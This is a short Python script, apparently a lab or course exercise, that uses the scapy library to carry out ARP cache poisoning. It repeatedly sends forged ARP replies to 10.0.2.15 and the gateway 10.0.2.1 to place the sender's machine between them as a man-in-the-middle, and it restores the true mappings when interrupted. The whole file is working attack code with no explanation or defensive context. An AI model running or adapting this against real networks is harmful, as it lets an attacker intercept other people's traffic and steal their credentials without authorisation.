#/usr/bin/python3

import scapy.all as scapy
import time


def get_arp(ip_address_range):
    arp_packet = scapy.ARP(pdst = ip_address_range)
    broadcast_frame = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    results = scapy.srp(broadcast_frame/arp_packet, iface = "eth0", timeout = 2, verbose = False)
    return results[0][0][1].hwsrc

def spoof_it(target_ip, spoofed_ip):
    target_mac = get_arp(target_ip)
    spoof_message = scapy.ARP(op=2, pdst = target_ip, psrc = spoofed_ip, hwdst = target_mac)
    scapy.send(spoof_message, verbose = False)

def restore(dest_ip, src_ip):
    target_mac = get_arp(dest_ip)
    src_mac = get_arp(src_ip)
    spoof_message = scapy.ARP(op=2, pdst=dest_ip, psrc=src_ip, hwdst=target_mac, hwsrc=src_mac)
    scapy.send(spoof_message, count = 4, verbose = False)

counter = 0

try:
    while True:
        counter += 2
        spoof_it("10.0.2.15", "10.0.2.1")
        spoof_it("10.0.2.1", "10.0.2.15")
        print(f"\r[+] Amount of packets sent: {counter}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] CTRL-C pressed: restoring original state. Please Wait!")
    restore("10.0.2.1", "10.0.2.15")
    restore("10.0.2.15", "10.0.2.1")